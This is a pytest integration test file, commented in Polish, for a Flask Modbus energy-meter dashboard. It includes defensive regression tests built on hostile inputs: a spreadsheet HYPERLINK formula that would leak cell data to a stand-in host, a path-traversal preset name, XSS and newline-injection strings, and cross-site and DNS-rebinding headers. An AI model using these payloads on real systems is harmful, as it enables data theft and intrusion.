"""Testy integracyjne: aplikacja Flask + wbudowany symulator + prawdziwy transport pymodbus."""

import json
import socket
import time

import pytest

import app as app_module
from modbus_dash.web import create_app


def _free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _wait(fn, timeout=8.0, step=0.05):
    deadline = time.time() + timeout
    while time.time() < deadline:
        v = fn()
        if v:
            return v
        time.sleep(step)
    return fn()


@pytest.fixture(scope="module")
def env(tmp_path_factory):
    data = tmp_path_factory.mktemp("data")
    port = _free_port()
    presets = tmp_path_factory.mktemp("presets")
    args = app_module.parse_args(["--data-dir", str(data), "--presets-dir", str(presets), "--modbus-port", str(port),
                                  "--sim-preset", "simulator_3f:2", "--log-level", "WARNING"])
    ctx = app_module.AppContext(args)
    flask_app = create_app(ctx)
    flask_app.testing = True
    ctx.start()
    client = flask_app.test_client()
    yield ctx, client, port
    ctx.shutdown()


def post(client, url, body=None, **kw):
    return client.post(url, data=json.dumps(body if body is not None else {}),
                       content_type="application/json", **kw)


def put(client, url, body):
    return client.put(url, data=json.dumps(body), content_type="application/json")


def test_index_and_info(env):
    ctx, c, port = env
    r = c.get("/")
    assert r.status_code == 200 and b"<html" in r.data.lower()
    info = c.get("/api/info").get_json()
    assert info["version"] and info["simulator"]["port"] == port
    assert {d["unit"] for d in info["simulator"]["devices"]} == {1, 2}
    assert c.get("/api/config").get_json()["mode"] == "tcp"


def test_simulator_device_is_polled(env):
    ctx, c, _ = env
    data = _wait(lambda: (lambda d: d if d["status"]["state"] == "ok" else None)(
        c.get("/api/devices/symulator/values").get_json()))
    assert data, c.get("/api/devices/symulator/values").get_json()
    assert 200 < data["values"]["voltage_l1"] < 260
    assert 49 < data["values"]["frequency"] < 51
    assert data["meta"]["voltage_l1"]["unit"] == "V"
    devs = {d["id"]: d for d in c.get("/api/devices").get_json()}
    assert devs["symulator"]["locked"] and devs["sym-2"]["unit"] == 2
    hist = _wait(lambda: (lambda h: h if len(h["points"]) >= 2 else None)(
        c.get("/api/devices/symulator/history?seconds=60").get_json()))
    assert hist and hist["source"] in ("memory", "mixed") and "voltage_l1" in hist["keys"]
    csv = c.get("/api/devices/symulator/history.csv?seconds=60")
    assert csv.status_code == 200 and "Napięcie L1 [V]" in csv.get_data(as_text=True)


def test_legacy_live_scan_ping(env):
    ctx, c, port = env
    r = post(c, "/api/live", {"host": "127.0.0.1", "port": port, "unit": 1, "preset": "simulator_3f"})
    assert r.status_code == 200, r.get_json()
    vals = r.get_json()["values"]
    assert 49 < vals["frequency"]["value"] < 51 and vals["voltage_l1"]["unit"] == "V"
    r = post(c, "/api/scan", {"host": "127.0.0.1", "port": port, "unit": 1, "start": 0, "end": 70})
    assert r.status_code == 200, r.get_json()
    rows = {row["address"]: row for row in r.get_json()["registers"]}
    assert rows[36]["hint"]["guess"] == "frequency"
    assert rows[0]["hint"]["guess"] == "voltage"
    r = post(c, "/api/ping", {"host": "127.0.0.1", "port": port})
    assert r.status_code == 200 and r.get_json()["ok"]
    r = post(c, "/api/ping", {"host": "127.0.0.1", "port": _free_port()})
    assert r.status_code == 502 and not r.get_json()["ok"]


@pytest.mark.parametrize("body,frag", [
    ({"bus": "sim", "start": 10, "end": 5}, "end"),
    ({"bus": "sim", "start": "abc"}, "start"),
    ({"bus": "sim", "start": 0, "end": 5000}, "zakres"),
    ({"bus": "sim", "register_type": "foo"}, "register_type"),
    ({"bus": "nieznana"}, "magistrala"),
])
def test_scan_validation(env, body, frag):
    ctx, c, _ = env
    r = post(c, "/api/scan", body)
    assert 400 <= r.status_code < 500
    assert frag in r.get_json()["error"]


def test_scan_rejects_non_object_body(env):
    ctx, c, _ = env
    r = c.post("/api/scan", data="null", content_type="application/json")
    assert r.status_code == 400 and "JSON" in r.get_json()["error"]


def test_scan_holding_and_coils(env):
    ctx, c, _ = env
    r = post(c, "/api/scan", {"bus": "sim", "unit": 1, "start": 0, "end": 16, "register_type": "coil"})
    assert r.status_code in (200, 502)
    r = post(c, "/api/scan", {"bus": "sim", "unit": 1, "start": 0, "end": 10, "step": 1})
    assert r.status_code == 200 and r.get_json()["count"] == 10


def test_preset_crud_and_protection(env):
    ctx, c, _ = env
    body = {"name": "Test <b>xss</b>", "registers": {"voltage_l1": {"address": 0, "unit": "V"}}}
    r = post(c, "/api/presets", body)
    assert r.status_code == 201
    pid = r.get_json()["id"]
    r2 = post(c, "/api/presets", body)
    assert r2.get_json()["id"] != pid  # bez nadpisywania
    assert c.get(f"/api/presets/{pid}").get_json()["name"] == "Test <b>xss</b>"
    r = put(c, f"/api/presets/{pid}", {"name": "x", "registers": {"v": {"address": "zz"}}})
    assert r.status_code == 400 and r.get_json()["errors"]
    assert put(c, "/api/presets/simulator_3f", body).status_code == 403
    assert c.delete("/api/presets/simulator_3f").status_code == 403
    assert c.delete(f"/api/presets/{pid}").status_code == 200
    assert c.delete(f"/api/presets/{pid}").status_code == 404
    c.delete(f"/api/presets/{r2.get_json()['id']}")
    assert post(c, "/api/live", {"preset": "../../app", "bus": "sim"}).status_code == 404
    assert post(c, "/api/presets/validate", {"registers": {"a": {"address": -5}}}).get_json()["ok"] is False


def test_csrf_and_content_type(env):
    ctx, c, _ = env
    r = c.post("/api/presets", data=json.dumps({"name": "a"}), content_type="application/json",
               headers={"Origin": "http://evil.example"})
    assert r.status_code == 403
    r = c.delete("/api/presets/x", headers={"Sec-Fetch-Site": "cross-site"})
    assert r.status_code == 403
    r = c.post("/api/presets", data="name=a", content_type="application/x-www-form-urlencoded")
    assert r.status_code == 415


def test_buses_and_devices(env):
    ctx, c, port = env
    r = put(c, "/api/buses/lab", {"name": "Lab", "kind": "tcp", "host": "127.0.0.1", "port": port, "timeout": 0.5})
    assert r.status_code == 200, r.get_json()
    assert r.get_json()["describe"]
    r = post(c, "/api/buses/lab/ping", {"unit": 1})
    assert r.status_code == 200
    assert put(c, "/api/buses/sim", {"kind": "tcp"}).status_code == 400  # zablokowana (CLI)
    assert put(c, "/api/buses/zla", {"kind": "rtu", "serial_port": ""}).status_code == 400
    r = put(c, "/api/devices/lab1", {"name": "Lab 1", "bus": "lab", "unit": 2, "preset": "simulator_3f",
                                     "interval": 0.5})
    assert r.status_code == 200, r.get_json()
    data = _wait(lambda: (lambda d: d if d["status"]["state"] == "ok" else None)(
        c.get("/api/devices/lab1/values").get_json()))
    assert data and data["values"]["voltage_l1"]
    assert c.delete("/api/buses/lab").status_code == 400  # używana przez urządzenie
    assert put(c, "/api/devices/lab1", {"bus": "brak"}).status_code == 400
    assert put(c, "/api/devices/BAD ID", {"bus": "lab"}).status_code in (400, 404)
    assert c.delete("/api/devices/lab1").status_code == 200
    assert c.get("/api/devices/lab1/values").status_code == 404
    assert c.delete("/api/buses/lab").status_code == 200


def _job(c, r):
    assert r.status_code == 202, r.get_json()
    job_id = r.get_json()["id"]
    return _wait(lambda: (lambda j: j if j["state"] != "running" else None)(
        c.get(f"/api/jobs/{job_id}").get_json()), timeout=30)


def test_unit_scan_and_detect(env):
    ctx, c, _ = env
    job = _job(c, post(c, "/api/scan/units", {"bus": "sim", "first": 1, "last": 4, "timeout": 0.2}))
    assert job["state"] == "done", job
    assert [f["unit"] for f in job["result"]["found"]] == [1, 2]
    job = _job(c, post(c, "/api/detect", {"bus": "sim", "unit": 1}))
    assert job["state"] == "done", job
    best = job["result"]["candidates"][0]
    assert best["id"] == "simulator_3f"
    assert best["meta"]["voltage_l1"]["unit"] == "V"


def test_write_disabled_by_default(env):
    ctx, c, _ = env
    assert post(c, "/api/write", {"bus": "sim", "unit": 1, "address": 0, "value": 1}).status_code == 403


def test_metrics_and_health(env):
    ctx, c, _ = env
    _wait(lambda: c.get("/api/health").status_code == 200)
    text = c.get("/metrics").get_data(as_text=True)
    assert 'modbus_dash_value{device="symulator"' in text
    assert c.get("/api/health").get_json()["devices"]["symulator"] == "ok"


def test_settings_roundtrip(env):
    ctx, c, _ = env
    r = put(c, "/api/settings/mqtt", {"enabled": False, "host": "broker", "port": 1884, "password": "tajne"})
    assert r.status_code == 200 and r.get_json()["settings"]["password"] == "********"
    r = put(c, "/api/settings/mqtt", {"enabled": False, "host": "broker", "port": 1884, "password": "********"})
    assert ctx.config.get()["mqtt"]["password"] == "tajne"
    assert put(c, "/api/settings/mqtt", {"port": 0}).status_code == 400
    r = put(c, "/api/settings/history", {"bucket_seconds": 30})
    assert r.status_code == 200 and r.get_json()["settings"]["bucket_seconds"] == 30
    assert put(c, "/api/settings/history", {"bucket_seconds": 7}).status_code == 400


def test_auth(tmp_path):
    args = app_module.parse_args(["--data-dir", str(tmp_path), "--presets-dir", str(tmp_path / "p"), "--no-sim",
                                  "--no-history", "--auth", "admin:tajne"])
    ctx = app_module.AppContext(args)
    c = create_app(ctx).test_client()
    try:
        assert c.get("/api/info").status_code == 401
        import base64
        tok = base64.b64encode(b"admin:tajne").decode()
        assert c.get("/api/info", headers={"Authorization": f"Basic {tok}"}).status_code == 200
        bad = base64.b64encode(b"admin:zle").decode()
        assert c.get("/api/info", headers={"Authorization": f"Basic {bad}"}).status_code == 401
    finally:
        ctx.shutdown()


def test_unknown_api_route_is_json(env):
    ctx, c, _ = env
    r = c.get("/api/nie-ma")
    assert r.status_code == 404 and r.get_json()["error"]


def test_modbus_errors_are_json(env):
    ctx, c, _ = env
    r = post(c, "/api/scan", {"bus": "sim", "unit": 99, "start": 0, "end": 10})
    assert r.status_code in (502, 504) and r.get_json()["error"]
    r = post(c, "/api/live", {"bus": "sim", "unit": 99, "preset": "simulator_3f"})
    assert r.status_code == 502 and "timeout" in r.get_json()["error"].lower() or "odpowiedzi" in r.get_json()["error"]


def test_partial_settings_update_and_types(env):
    ctx, c, _ = env
    put(c, "/api/settings/mqtt", {"enabled": False, "host": "broker.lan", "port": 1885, "password": "nowe"})
    r = put(c, "/api/settings/mqtt", {"interval": 20})
    s = r.get_json()["settings"]
    assert (s["host"], s["port"], s["interval"]) == ("broker.lan", 1885, 20)
    r = put(c, "/api/settings/mqtt", {"port": "1883"})
    assert r.status_code == 400 and "port" in r.get_json()["error"]


def test_create_flag_prevents_overwrite(env):
    ctx, c, port = env
    body = {"kind": "tcp", "host": "127.0.0.1", "port": port}
    assert c.put("/api/buses/dup?create=1", data=json.dumps(body), content_type="application/json").status_code == 200
    r = c.put("/api/buses/dup?create=1", data=json.dumps(body), content_type="application/json")
    assert r.status_code == 409
    dev = {"bus": "dup", "unit": 1, "preset": "simulator_3f", "enabled": False}
    assert c.put("/api/devices/d1?create=1", data=json.dumps(dev), content_type="application/json").status_code == 200
    assert c.put("/api/devices/d1?create=1", data=json.dumps(dev), content_type="application/json").status_code == 409
    c.delete("/api/devices/d1")
    c.delete("/api/buses/dup")


def test_broken_preset_file_returns_text(env):
    ctx, c, _ = env
    (ctx.presets.user_dir / "zepsuty.json").write_text('{"name": "x", ', encoding="utf-8")
    try:
        r = c.get("/api/presets/zepsuty")
        assert r.status_code == 422 and r.get_json()["text"].startswith('{"name"')
        listed = {p["id"]: p for p in c.get("/api/presets").get_json()}
        assert listed["zepsuty"]["valid"] is False
        r = post(c, "/api/live", {"bus": "sim", "preset": "zepsuty"})
        assert r.status_code == 400
    finally:
        (ctx.presets.user_dir / "zepsuty.json").unlink()


def test_json_keeps_preset_field_order(env):
    ctx, c, _ = env
    r = c.get("/api/presets/simulator_3f")
    keys = list(json.loads(r.get_data(as_text=True)))
    assert keys.index("name") < keys.index("registers")
    regs = list(json.loads(r.get_data(as_text=True))["registers"])
    assert regs[:3] == ["voltage_l1", "voltage_l2", "voltage_l3"]


def test_history_toggle_without_restart(env):
    ctx, c, _ = env
    assert ctx.history is not None
    r = put(c, "/api/settings/history", {"enabled": False})
    assert r.get_json()["active"] is False and ctx.history is None
    r = put(c, "/api/settings/history", {"enabled": True})
    assert r.get_json()["active"] is True and ctx.history is not None


# ── regresje z przeglądu ──────────────────────────────────────
def test_unknown_host_is_rejected_without_auth(env, tmp_path):
    from modbus_dash.web import host_allowed
    ctx, c, _ = env
    for host in ("evil.example", "evil.example:5000"):
        r = c.get("/api/config", headers={"Host": host})
        assert r.status_code == 403 and "--allowed-host" in r.get_json()["error"]
        r = c.put("/api/buses/rebound", data=json.dumps({"kind": "tcp", "host": "127.0.0.1"}),
                  content_type="application/json", headers={"Host": host, "Origin": f"http://{host}"})
        assert r.status_code == 403
    assert c.get("/", headers={"Host": "evil.example"}).status_code == 403
    for host in ("localhost:5000", "127.0.0.1", "[::1]:5000", "192.168.1.20:5000", "pi.localhost"):
        assert c.get("/api/health", headers={"Host": host}).status_code == 200, host
    import socket as _s
    assert host_allowed(_s.gethostname()) and host_allowed(_s.gethostname().split(".")[0] + ".local:80")
    assert host_allowed("energia.lan:5000", ["energia.lan"]) and host_allowed("pi.dom.lan", ["*.dom.lan"])
    assert not host_allowed("dom.lan.evil.example", ["*.dom.lan"]) and host_allowed("x.y", ["*"])
    # z hasłem rebinding nic nie da (przeglądarka nie ma danych logowania dla obcej domeny)
    args = app_module.parse_args(["--data-dir", str(tmp_path), "--presets-dir", str(tmp_path / "p"), "--no-sim",
                                  "--no-history", "--auth", "admin:tajne"])
    actx = app_module.AppContext(args)
    try:
        import base64
        tok = base64.b64encode(b"admin:tajne").decode()
        r = create_app(actx).test_client().get("/api/info", headers={"Host": "nas.example",
                                                                     "Authorization": f"Basic {tok}"})
        assert r.status_code == 200
    finally:
        actx.shutdown()


def test_allowed_host_option(tmp_path):
    args = app_module.parse_args(["--data-dir", str(tmp_path), "--presets-dir", str(tmp_path / "p"), "--no-sim",
                                  "--no-history", "--allowed-host", "energia.lan"])
    actx = app_module.AppContext(args)
    try:
        c = create_app(actx).test_client()
        assert c.get("/api/health", headers={"Host": "energia.lan:5000"}).status_code == 200
        assert c.get("/api/health", headers={"Host": "inna.lan"}).status_code == 403
    finally:
        actx.shutdown()


def test_mqtt_password_not_sent_to_new_broker(env):
    ctx, c, _ = env
    assert put(c, "/api/settings/mqtt", {"enabled": False, "host": "broker.lan", "port": 1883,
                                         "username": "ha", "password": "S3cret"}).status_code == 200
    for change in ({"host": "127.0.0.1"}, {"port": 7062}, {"username": "inny"}, {"tls": True}):
        for pw in ({"password": "********"}, {}):
            r = put(c, "/api/settings/mqtt", {**change, **pw})
            assert r.status_code == 400 and r.get_json()["field"] == "password", (change, pw)
    assert ctx.config.get()["mqtt"]["host"] == "broker.lan"
    r = put(c, "/api/settings/mqtt", {"interval": 15, "password": "********"})
    assert r.status_code == 200 and ctx.config.get()["mqtt"]["password"] == "S3cret"
    r = put(c, "/api/settings/mqtt", {"host": "127.0.0.1", "password": "nowe"})
    assert r.status_code == 200 and ctx.config.get()["mqtt"]["password"] == "nowe"


def test_csv_header_is_formula_safe(env):
    ctx, c, _ = env
    raw = json.loads(c.get("/api/presets/simulator_3f?raw=1").get_data(as_text=True))
    raw["name"] = "CSV formuły"
    raw["registers"]["voltage_l1"]["label"] = '=HYPERLINK("http://x/?"&A2,"V")'
    raw["registers"]["frequency"]["label"] = "@SUM(1+1)"
    assert put(c, "/api/presets/csvtest", raw).status_code == 200
    assert put(c, "/api/devices/csvdev", {"bus": "sim", "unit": 1, "preset": "csvtest",
                                          "enabled": False}).status_code == 200
    try:
        assert post(c, "/api/devices/csvdev/read").status_code == 200
        text = c.get("/api/devices/csvdev/history.csv?seconds=60").get_data(as_text=True)
        header = text.lstrip("﻿").splitlines()[0]
        assert "'=HYPERLINK" in header and "'@SUM(1+1) [Hz]" in header
        assert ';"=' not in header and ";@" not in header
    finally:
        c.delete("/api/devices/csvdev")
        c.delete("/api/presets/csvtest")


def test_ping_bodies(env):
    ctx, c, _ = env
    for body in ("[]", "1", '"x"'):
        r = c.post("/api/buses/sim/ping", data=body, content_type="application/json")
        assert r.status_code == 400, body
    assert c.post("/api/buses/sim/ping").status_code == 200  # brak treści = test łącza
    r = c.post("/api/ping", data="[1]", content_type="application/json")
    assert r.status_code == 400


def test_scan_preset_skips_malformed_hints(env):
    ctx, c, _ = env
    good = {"address": 0, "raw": [17254, 0], "hint": {"guess": "voltage", "type": "float32",
                                                       "byte_order": "ABCD", "score": 0.9, "value": 230}}
    rows = [good]
    for hint in ({"score": "x"}, {"guess": []}, {"guess": {}}, {"scale": float("nan")}, {"scale": float("inf")},
                 {"alternatives": [{"guess": []}]}):
        rows.append({**good, "address": 10 + len(rows) * 2, "hint": {**good["hint"], **hint}})
    r = c.post("/api/scan/preset", data=json.dumps({"registers": rows}).replace("NaN", "NaN"),
               content_type="application/json")
    assert r.status_code == 200, r.get_data(as_text=True)
    assert len(r.get_json()["registers"]) >= 1
    assert post(c, "/api/scan/preset", {"registers": rows[:1], "byte_order": ["ABCD"]}).status_code == 400
    assert post(c, "/api/scan/preset", {"registers": rows[:1], "alignment": "środek"}).status_code == 400


def test_locked_bus_cannot_be_deleted(env):
    ctx, c, _ = env
    r = c.delete("/api/buses/sim")
    assert r.status_code == 400 and "CLI" in r.get_json()["error"]
    assert "sim" in ctx.config.get()["buses"]


def test_device_enabled_must_be_boolean(env):
    ctx, c, _ = env
    for bad in ("false", 0, "tak"):
        r = put(c, "/api/devices/flagdev", {"bus": "sim", "unit": 1, "enabled": bad})
        assert r.status_code == 400 and "enabled" in r.get_json()["error"], bad
    assert "flagdev" not in ctx.config.get()["devices"]


def test_integer_settings_reject_fractions(env):
    ctx, c, _ = env
    r = put(c, "/api/settings/history", {"memory_points": 3600.5})
    assert r.status_code == 400
    r = put(c, "/api/settings/history", {"memory_points": 3600.0})
    assert r.status_code == 200 and type(ctx.config.get()["history"]["memory_points"]) is int
    assert put(c, "/api/settings/mqtt", {"interval": 2.5}).status_code == 400


def test_preset_validation_edge_cases(env):
    ctx, c, _ = env
    base = {"name": "Brzegowy", "registers": {"voltage_l1": {"address": 0}}}
    for extra in ({"probe": ["voltage_l1"]}, {"probe": {"a": 1}}):
        r = post(c, "/api/presets/validate", {**base, **extra})
        assert r.status_code == 200 and not r.get_json()["ok"]
        assert post(c, "/api/presets", {**base, **extra}).status_code == 400
    r = c.post("/api/presets", data='{"name": "NaN test", "registers": {"v": {"address": 0, "scale": NaN}}}',
               content_type="application/json")
    assert r.status_code == 400
    assert put(c, "/api/presets/nl%0A", base).status_code in (400, 404)
    r = post(c, "/api/presets", {**base, "name": "- SDM630 garaż"})
    assert r.status_code == 201 and r.get_json()["id"] == "SDM630 garaż"
    c.delete("/api/presets/" + "SDM630 garaż")
